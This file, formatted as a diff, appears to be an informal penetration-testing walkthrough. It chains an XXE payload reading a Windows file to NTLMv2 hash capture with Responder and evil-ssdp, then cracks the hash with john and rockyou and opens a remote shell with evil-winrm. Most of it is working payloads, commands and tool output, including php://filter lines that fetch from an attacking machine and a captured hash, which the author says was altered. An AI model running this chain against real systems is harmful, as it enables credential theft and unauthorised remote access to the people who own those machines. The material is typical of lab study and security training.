@@ -1,0 +1,74 @@
+Discovery Phase:
+
+<?xml version = "1.0"?><!DOCTYPE foo [<!ENTITY own SYSTEM "file:///c:/windows/win.ini"> ]>
+<person>
+<name>offsec
+	&own;
+</name>
+</person>
+If we can verify that we're able to read the contents of a file-system with XXE - we're able to move on.
+
+You're going to need a few things for this to work though.
+
+Responder
+evil-ssdp
+evil-winrm
+
+Go ahead and get a Responder session running.
+
+responder -I tun0 -v
+Now that we have a Responder session running, we need to do a little bit of evil magic.
+
+Open a new terminal, and in that terminal - let's start up evil-ssdp.py
+
+python3 /usr/share/evil-ssdp/evil_ssdp.py <interface>
+This should give you output that looks something akin too...:
+
+___________     .__.__    _________ _________________ __________
+\_   _____/__  _|__|  |  /   _____//   _____/\______ \\______   \
+ |    __)_\  \/ /  |  |  \_____  \ \_____  \  |    |  \|     ___/
+ |        \\   /|  |  |__/        \/        \ |    `   \    |
+/_______  / \_/ |__|____/_______  /_______  //_______  /____|
+        \/                      \/        \/         \/
+
+...by initstring (gitlab.com/initstring)
+Additional contributors: Dwight Hohnstein
+
+########################################
+[*] EVIL TEMPLATE:           /usr/share/evil-ssdp/templates/office365
+[*] MSEARCH LISTENER:        tun0
+[*] DEVICE DESCRIPTOR:       http://x.x.x.x:8888/ssdp/device-desc.xml
+[*] SERVICE DESCRIPTOR:      http://x.x.x.x:8888/ssdp/service-desc.xml
+[*] PHISHING PAGE:           http://x.x.x.x:8888/ssdp/present.html
+[*] SMB POINTER:             file://///x.x.x.x/smb/hash.jpg
+########################################
+Thanks Dwight.
+
+The idea behind this attack is that we're going to utilize whatever protocol native to Windows that we can. There are a few options. We have:
+
+ftp://
+file:///
+http://
+(If the target machine has PHP installed, we're in luck with that as well)
+php://filter/convert.base64-encode/resource=c:/windows/win.ini
+php://filter/convert.base64-encode/resource=http://atacking-machine:80/evil.txt
+The one we're interested in is the file:/// protocol.
+
+I suggest using Burp Suite's Repeater - but feel free to do whatever you want. The idea is that we're going to use the file:/// to point towards our SMB Share (CIFS or Common Internet File Structure). When we do so, Responder will capture the NTLM hash.
+
+Nice, eh?
+
+[SMB] NTLMv2-SSP Client   : ::ffff:[REDACTED]
+[SMB] NTLMv2-SSP Username : [REDACTED-PC]\[REDACTED-USER]
+[SMB] NTLMv2-SSP Hash     : [REDACTED-USER]::WIN-REDACTED:ffda536eebddd9ff:56608E6BB63B9EF8075E75E6FCFEAD13:010100000000000080070C0C4462D8014105FCCC2A7C88C7000BBB00020008004B0049003000490001001E00570049004E002D0046004E0056005800580034005800530047004900470004003400570049004E002DAA46004E005600580058003400580053004700490047002E004B0Z4900300049002E004C004F00430041004C00030014004B004300300049002E004C004F00470041004C00050014004B004900200049002E004C004F004300410C4C000700080080070B0B4462D8010600040002000000080030003000000000000000000000000030000074C73B2884C3F6CAB391C1BFDD689CBD8363A424AAAA27C415102C0CDA855CE20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003710000000000000000000000000
+This hash won't crack, because I changed up a few things for Security reasoning. But if you ever do receive a NTLMv2 hash like this, try cracking with john.
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+Let's suppose it gave us the password 'ohnoitss1ren'.
+
+
+$---Bling Bling---$
+
+From this point forward, we're going to make use of one of my favorite tools. evil-winrm to gain a shell on the target machine.
+
+evil-winrm -i <target-box> -u <target-username> -p ohnoitss1ren
